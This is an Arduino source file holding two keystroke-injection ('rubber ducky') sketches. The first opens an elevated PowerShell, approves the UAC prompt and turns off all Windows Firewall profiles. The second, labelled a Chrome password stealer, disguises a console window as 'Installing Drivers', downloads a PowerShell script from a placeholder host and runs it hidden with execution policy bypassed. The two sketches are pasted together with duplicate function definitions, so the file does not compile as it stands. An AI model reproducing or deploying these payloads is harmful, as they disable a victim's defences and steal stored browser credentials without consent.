#include <Keyboard.h>
void setup() {
Keyboard.begin();
delay(1000);
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press(114);
Keyboard.releaseAll();
delay(200);
Keyboard.print("powershell Start-Process powershell -Verb runAs");
typeKey(KEY_RETURN);
delay(1000);
Keyboard.press(KEY_LEFT_ALT);
Keyboard.press(121);
Keyboard.releaseAll();
delay(200);
Keyboard.print("Write-Host \"Disabling Firewall...\"");
typeKey(KEY_RETURN);
delay(200);
Keyboard.print("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False");
typeKey(KEY_RETURN);
delay(500);
//  Keyboard.print("netsh advfirewall set allprofiles state off");
//  typeKey(KEY_RETURN);
//  delay(500);
Keyboard.print("exit");
typeKey(KEY_RETURN);
delay(30);
Keyboard.end();
}
void typeKey(int key){
Keyboard.press(key);
delay(50);
Keyboard.release(key);
}
void loop() {}




/*
 * 
 *Chrome Password Stealer for Arduino pro micro rubber ducky - Coded by SpeedCuber
 *Change http://0.0.0.0/chrome/cpe.PS1 with cpe.PS1 download link
 * 
 */



void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  
  cpe();
  
}

void cpe()
{

// --> Initial delay ,Back to desktop and open run.
 deskrun();
 
 // --> Obfuscate the command prompt
 Keyboard.print("cmd /T:01 /K mode con:COLS=15 LINES=1 &&title Installing Drivers");
 delay(300);
 typeKey(KEY_RETURN);
 
 // --> Creating Temporary Directories
 delay(100);
 Keyboard.print("cd / & mkdir Intel & cd Intel & mkdir passwd & cd passwd");
 typeKey(KEY_RETURN);
 delay(300);

 // --> Download and execute the CPE
 Keyboard.print(F("echo (wget  http://0.0.0.0/chrome/cpe.PS1 -OutFile cpe.PS1) > cpe.PS1 ")); 
 typeKey(KEY_RETURN);
 delay(300);
 Keyboard.print(F("powershell -windowstyle hidden  -ExecutionPolicy ByPass -File cpe.ps1"));
 typeKey(KEY_RETURN);
 delay(300);

 Keyboard.press(KEY_UP_ARROW);
 typeKey(KEY_RETURN);
  
 Keyboard.end();
  
  }

void deskrun()
{
  delay(3000);
  Keyboard.begin();
  // --> Back to Desktop
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();
  delay(500);
  // --> Open run
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(700);
  
  }
  
/* Unused endless loop */
void loop() {}
